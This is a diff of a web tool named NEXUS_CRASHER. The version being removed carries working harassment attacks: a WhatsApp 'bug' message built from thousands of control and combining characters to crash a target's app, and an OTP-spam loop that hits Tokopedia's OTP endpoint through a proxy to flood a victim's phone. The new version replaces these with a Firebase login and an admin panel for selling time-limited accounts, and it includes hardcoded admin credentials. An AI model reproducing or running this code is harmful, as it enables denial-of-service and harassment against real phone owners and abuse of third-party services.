@@ -3,101 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS_CRASHER v1.1 | hanzX</title>
+    <title>NEXUS_CRASHER v2.0 | hanzX Official</title>
     <style>
         :root { --bg: #090206; --panel: #160410; --neon: #cc0033; --text: #ffffff; }
         body { background-color: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding-bottom: 80px; }
         .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 10px rgba(204, 0, 51, 0.5); }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; outline: none; }
-        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); z-index: 100; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; outline: none; }
+        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; width: 100%; }
         .hidden { display: none !important; }
-        #log-box { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; height: 80px; overflow-y: auto; border: 1px solid #333; margin-top: 10px; }
+        .sidebar { position: fixed; top: 0; right: -280px; width: 280px; height: 100%; background: var(--panel); border-left: 2px solid var(--neon); transition: 0.3s; z-index: 1000; padding: 20px; box-sizing: border-box; overflow-y: auto; }
+        .sidebar.active { right: 0; }
+        .badge { padding: 2px 6px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; background: #cc0033; color: white; }
     </style>
 </head>
 <body>
 
     <div id="login-screen" style="height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;">
-        <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon);">NEXUS_CRASHER</h1>
-        <div class="card" style="width: 80%;">
+        <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon); font-size: 1.8rem;">NEXUS_CRASHER</h1>
+        <div class="card" style="width: 85%;">
             <input type="text" id="u" placeholder="Username...">
             <input type="password" id="p" placeholder="Password...">
-            <button class="btn-main" onclick="gasLogin()">AUTHENTICATE</button>
+            <button class="btn-main" onclick="handleLogin()">AUTHENTICATE</button>
             <p id="msg" style="color: red; text-align: center; font-size: 0.8rem; margin-top: 10px;"></p>
         </div>
     </div>
 
     <div id="app" class="hidden">
-        <div style="padding: 15px; border-bottom: 1px solid var(--neon); text-align: center; color: var(--neon);">[ NEXUS_CRASHER v1.1 ]</div>
-        
+        <header style="padding: 15px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center; background: #11020a;">
+            <span style="color: var(--neon); font-weight: bold;">[ NEXUS_V2 ]</span>
+            <span style="font-size: 1.5rem; cursor: pointer; color: var(--neon);" id="admin-trigger" class="hidden" onclick="toggleSidebar()">☰</span>
+        </header>
+
         <div id="p-home" class="page">
             <div class="card">
-                <h3>DASHBOARD</h3>
-                <p>Welcome back, <b id="display-u"></b> <span style="color:#00ffff;">[ADMIN]</span></p>
-                <p style="color: #00ff00; font-size: 0.7rem;">STATUS: BYPASS MODE ACTIVE</p>
+                <h3 style="margin-top:0;">DASHBOARD</h3>
+                <p>User: <b id="disp-u" style="color: #00ffff;"></b></p>
+                <p>Role: <span id="disp-r" class="badge"></span></p>
+                <p>Status: <span id="disp-e" style="color: yellow;"></span></p>
             </div>
             <div class="card" style="padding:0; overflow:hidden;"><img src="https://i.ibb.co/6YfM0Xm/anime-dark.jpg" style="width:100%;"></div>
         </div>
 
-        <div id="p-attack" class="page hidden">
-            <div class="card">
-                <h3>HEAVY WA BUG</h3>
-                <input type="number" id="t-wa" placeholder="Target WA (628xxx)">
-                <button class="btn-main" onclick="kirimBug()">SEND ATTACK</button>
-            </div>
-            <div class="card">
-                <h3>SPAM OTP REAL</h3>
-                <input type="number" id="t-otp" placeholder="Target OTP (08xxx)">
-                <input type="number" id="c-otp" value="10">
-                <button class="btn-main" style="background:#008000;" onclick="startSpam()">START SPAM</button>
-                <div id="log-box">[ READY ]</div>
-            </div>
+        <div id="sidebar" class="sidebar">
+            <h3 style="color: var(--neon); margin-top:0;">ADMIN PANEL</h3>
+            <p style="font-size:0.7rem; color:gray;">Create cloud-based accounts</p>
+            <hr border="1" color="#cc0033" style="margin-bottom:15px;">
+            
+            <label>Username:</label>
+            <input type="text" id="nu" placeholder="New Username">
+            
+            <label>Password:</label>
+            <input type="password" id="np" placeholder="New Password">
+            
+            <label>Role Access:</label>
+            <select id="nr">
+                <option value="MEMBER">MEMBER</option>
+                <option value="OWNER">OWNER</option>
+                <option value="HIGH OWNER">HIGH OWNER</option>
+            </select>
+            
+            <label>Duration (Days):</label>
+            <input type="number" id="nd" placeholder="Ex: 30" value="7">
+            
+            <button class="btn-main" onclick="createUser()">DEPLOY ACCOUNT</button>
+            <button class="btn-main" style="background:#444; margin-top:10px;" onclick="toggleSidebar()">CLOSE PANEL</button>
         </div>
-
-        <nav class="nav-bottom">
-            <div onclick="tab('home')">HOME</div>
-            <div onclick="tab('attack')">ATTACK</div>
-        </nav>
     </div>
 
     <script>
-        function gasLogin() {
-            const user = document.getElementById('u').value.trim().toLowerCase();
+        // LINK DATABASE FIREBASE LU MPROY!
+        const BASE_URL = "https://nexuscrasher-default-rtdb.asia-southeast1.firebasedatabase.app/users";
+
+        async function handleLogin() {
+            const user = document.getElementById('u').value.trim();
             const pass = document.getElementById('p').value.trim();
-            
-            // JALUR SAKTI: Kaga pake database-database-an cok!
-            if (user === "hanzx" && pass === "admin") {
-                document.getElementById('login-screen').classList.add('hidden');
-                document.getElementById('app').classList.remove('hidden');
-                document.getElementById('display-u').innerText = user;
-            } else {
-                document.getElementById('msg').innerText = "Password Salah mpray! Cek huruf!";
+            const msg = document.getElementById('msg');
+
+            // 1. CEK HARDCODE ADMIN (LU SENDIRI)
+            if (user === "hanzX" && pass === "rehanganteng") {
+                showApp(user, "ADMIN", "PERMANENT", true);
+                return;
+            }
+
+            // 2. CEK DATABASE CLOUD (UNTUK MEMBER)
+            msg.innerText = "Authenticating...";
+            try {
+                const res = await fetch(`${BASE_URL}/${user}.json`);
+                const data = await res.json();
+                
+                if (data && data.p === pass) {
+                    const now = new Date().getTime();
+                    if (now > data.exp) {
+                        msg.innerText = "Akun Sudah Expired mpray! 💀";
+                    } else {
+                        const dateExp = new Date(data.exp).toLocaleDateString();
+                        showApp(user, data.r, `Valid until ${dateExp}`, false);
+                    }
+                } else {
+                    msg.innerText = "Username/Password Salah mpray!";
+                }
+            } catch (e) { 
+                msg.innerText = "Database Error! Cek Rules Firebase lu cok!"; 
             }
         }
 
-        function tab(n) {
-            document.querySelectorAll('.page').forEach(x => x.classList.add('hidden'));
-            document.getElementById('p-' + n).classList.remove('hidden');
+        function showApp(u, r, e, isAdmin) {
+            document.getElementById('login-screen').classList.add('hidden');
+            document.getElementById('app').classList.remove('hidden');
+            document.getElementById('disp-u').innerText = u;
+            document.getElementById('disp-r').innerText = r;
+            document.getElementById('disp-e').innerText = e;
+            if (isAdmin) document.getElementById('admin-trigger').classList.remove('hidden');
         }
 
-        function kirimBug() {
-            const t = document.getElementById('t-wa').value;
-            const bug = encodeURIComponent("%0D".repeat(10000) + "҈҉" + " ௌ ".repeat(600));
-            window.location.href = "https://api.whatsapp.com/send?phone=" + t + "&text=" + bug;
-        }
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); }
 
-        async function startSpam() {
-            const t = document.getElementById('t-otp').value;
-            const c = document.getElementById('c-otp').value;
-            const log = document.getElementById('log-box');
-            log.innerHTML = "[*] Injecting OTP...<br>";
-            for(let i=1; i<=c; i++) {
-                try {
-                    await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://accounts.tokopedia.com/otp/v1/send?phone=' + t)}`);
-                    log.innerHTML += `[+] OTP #${i} Sent!<br>`;
-                } catch(e) { log.innerHTML += "[-] Limit!<br>"; }
-                log.scrollTop = log.scrollHeight;
-                await new Promise(r => setTimeout(r, 1500));
+        async function createUser() {
+            const u = document.getElementById('nu').value.trim();
+            const p = document.getElementById('np').value.trim();
+            const r = document.getElementById('nr').value;
+            const d = document.getElementById('nd').value;
+
+            if (!u || !p || !d) return alert("Data harus lengkap cok!");
+
+            // Hitung Waktu Expired (Hari ke Milidetik)
+            const expTime = new Date().getTime() + (parseInt(d) * 24 * 60 * 60 * 1000);
+
+            try {
+                const res = await fetch(`${BASE_URL}/${u}.json`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ p: p, r: r, exp: expTime })
+                });
+
+                if(res.ok) {
+                    alert(`SUKSES! Akun ${u} aktif ${d} hari. Sekarang bisa login di HP mana aja!`);
+                    toggleSidebar();
+                }
+            } catch (e) {
+                alert("Gagal koneksi ke Firebase mpray!");
             }
         }
     </script>
